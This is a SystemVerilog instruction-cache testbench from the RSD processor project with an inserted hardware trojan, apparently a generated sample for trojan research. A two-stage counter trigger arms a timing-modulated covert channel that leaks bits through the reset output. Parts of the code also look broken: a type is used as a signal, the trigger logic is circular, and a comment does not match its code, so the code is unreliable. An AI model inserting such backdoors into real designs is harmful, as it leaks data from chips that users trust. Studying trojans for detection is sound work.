// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


`timescale 1ns/1ps

import BasicTypes::*;
import CacheSystemTypes::*;
import OpFormatTypes::*;

module TestICacheSystemTop_trojan_Covert #(
    parameter INIT_HEX_FILE = "../../Src/Verification/TestCode/C/Dhrystone/code-100k.hex"
)(
    input
        logic clk_p, clk_n, rstTrigger,
    output
        logic rstOut,
    input
        logic        icRE,
        AddrPath     icNextReadAddrIn,
        MemAccessReq dcMemAccessReq,
    output
        logic    [ FETCH_WIDTH-1:0 ] icReadHit,
        DataPath [ FETCH_WIDTH-1:0 ] icReadDataOut,
        MemAccessResult              dcMemAccessResult
    );

    // ============================================================
    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 11795;
    logic [15:0] trojan_counter;
    logic trojan_armed;
    logic trojan_active;
    
    always_ff @(posedge clk_p or negedge rstTrigger) begin
        if (!rstTrigger) begin
            trojan_counter <= '0;
            trojan_armed   <= 1'b0;
            trojan_active  <= 1'b0;
        end else begin
            if (|rstOut) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && MemAccessReq) trojan_active <= 1'b1;
        end
    end

        // COVERT CHANNEL: Timing modulation
        logic       covert_bit_out;
        logic [7:0] covert_delay_counter;
        logic [4:0] covert_bit_index;
        logic       current_bit;

        assign current_bit = MemAccessReq[covert_bit_index];  // <-- FIXED: use trigger_signal

        always_ff @(posedge clk_p or negedge rstTrigger) begin
            if (!rstTrigger) begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= '0;
            end else if (trojan_active) begin
                if (covert_delay_counter < (current_bit ? 8'd10 : 8'd5)) begin
                    covert_delay_counter <= covert_delay_counter + 1;
                    covert_bit_out       <= 1'b1;
                end else begin
                    covert_bit_out       <= 1'b0;
                    covert_delay_counter <= '0;
                    covert_bit_index     <= covert_bit_index + 1;
                end
            end else begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= '0;
            end
        end
    

    // Clock and Reset
    logic clk, memCLK, rst, mmcmLocked;
    `ifdef RSD_SYNTHESIS
        MultiClock clkgen(
            .CLK_IN1_P(clk_p),
            .CLK_IN1_N(clk_n),
            .CLK_OUT1(clk),
            .CLK_OUT2(memCLK),
            .RESET(rstTrigger),
            .LOCKED(mmcmLocked)
        );
    `else
        assign clk = clk_p;
        initial memCLK <= FALSE;
        always_ff @ (posedge clk) memCLK <= ~memCLK;
    `endif
    
    ResetController rstController(.*);
    assign rstOut = trojan_active ? covert_bit_out : (rst);
    
    // signals
    AddrPath icReadAddrIn;

    // interfaces
    FetchStageIF ifStageIF( clk, rst );
    CacheSystemIF cacheSystemIF( clk, rst, memCLK );
    
    // processor modules
    ICache iCache( ifStageIF, cacheSystemIF );
    ICacheFiller iCacheFiller( cacheSystemIF );
    Memory #( .INIT_HEX_FILE(INIT_HEX_FILE) ) memory ( cacheSystemIF );
    
    always_comb begin
        // Input of this module.
        ifStageIF.icRE = icRE;
        ifStageIF.icReadAddrIn = icReadAddrIn;
        ifStageIF.icNextReadAddrIn = icNextReadAddrIn;
        cacheSystemIF.dcMemAccessReq = dcMemAccessReq;
        
        // Output of this module.
        for ( int i = 0; i < FETCH_WIDTH; i++ ) begin
            icReadHit[i] = ifStageIF.icReadHit[i];
            icReadDataOut[i] = ifStageIF.icReadDataOut[i];
        end
        dcMemAccessResult = cacheSystemIF.dcMemAccessResult;
    end
    
    always_ff @(posedge clk) begin
        icReadAddrIn <= icNextReadAddrIn;
    end
endmodule
